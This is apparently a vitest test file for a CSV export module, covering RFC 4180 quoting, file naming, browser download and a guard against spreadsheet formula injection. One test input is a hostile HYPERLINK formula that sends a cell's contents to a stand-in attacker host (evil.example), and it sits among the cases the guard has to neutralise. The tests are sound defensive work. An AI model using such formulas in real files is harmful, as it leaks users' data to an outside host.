import { afterEach, describe, expect, it, vi } from 'vitest'

import { answer } from '@/mocks/fixtures'

import { csvField, csvFileName, downloadCsv, toCsv } from './csv'

describe('csvField', () => {
  it.each([
    [null, ''],
    [42, '42'],
    [-5, '-5'],
    [267868.17978624784, '267868.17978624784'],
    [true, 'true'],
    ['Beverages', 'Beverages'],
    ['Grains/Cereals', 'Grains/Cereals'],
  ])('writes %j as %j', (value, expected) => {
    expect(csvField(value)).toBe(expected)
  })

  it('quotes commas, quotes and line breaks (RFC 4180)', () => {
    expect(csvField('Smith, John')).toBe('"Smith, John"')
    expect(csvField('say "hi"')).toBe('"say ""hi"""')
    expect(csvField('two\nlines')).toBe('"two\nlines"')
  })

  it.each([
    ['=1+1', "'=1+1"],
    ['+33 1 23', "'+33 1 23"],
    ['-5', "'-5"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1', "'\t=1"],
    // The guard comes before the quoting, so the ' is inside the quotes.
    ['=HYPERLINK("http://evil.example?"&A1)', '"\'=HYPERLINK(""http://evil.example?""&A1)"'],
  ])('stops the formula %j from running in a spreadsheet', (value, expected) => {
    expect(csvField(value)).toBe(expected)
  })

  it('writes other JSON values (arrays, objects) as JSON text', () => {
    expect(csvField([1, 2])).toBe('"[1,2]"')
  })
})

describe('toCsv', () => {
  it('writes the header, then the rows, each line ending in CRLF', () => {
    const csv = toCsv(answer.columns, answer.rows.slice(0, 2))

    expect(csv).toBe(
      'category_name,total_sales\r\nBeverages,267868.17978624784\r\nProduce,99984.58007357619\r\n',
    )
  })

  it('guards column names too (they come from the LLM)', () => {
    expect(toCsv(['=cmd'], [])).toBe("'=cmd\r\n")
  })
})

describe('csvFileName', () => {
  it.each([
    [
      'What is the total sales amount per category?',
      'what-is-the-total-sales-amount-per-category.csv',
    ],
    ['???', 'result.csv'],
    ['a'.repeat(100), `${'a'.repeat(60)}.csv`],
  ])('%j → %j', (question, expected) => {
    expect(csvFileName(question)).toBe(expected)
  })
})

describe('downloadCsv', () => {
  afterEach(() => {
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })

  it('downloads a UTF-8 file with a BOM through a temporary link', async () => {
    let saved: Blob | undefined
    vi.stubGlobal('URL', {
      createObjectURL: vi.fn<(blob: Blob) => string>((blob) => {
        saved = blob
        return 'blob:csv'
      }),
      revokeObjectURL: vi.fn<(url: string) => void>(),
    })
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})

    downloadCsv('sales.csv', 'a,b\r\n')

    expect(click).toHaveBeenCalledOnce()
    expect(click.mock.contexts[0]).toMatchObject({ download: 'sales.csv' })
    expect(saved?.type).toBe('text/csv;charset=utf-8')
    expect(new Uint8Array(await (saved as Blob).arrayBuffer()).slice(0, 3)).toEqual(
      new Uint8Array([0xef, 0xbb, 0xbf]),
    )
  })
})
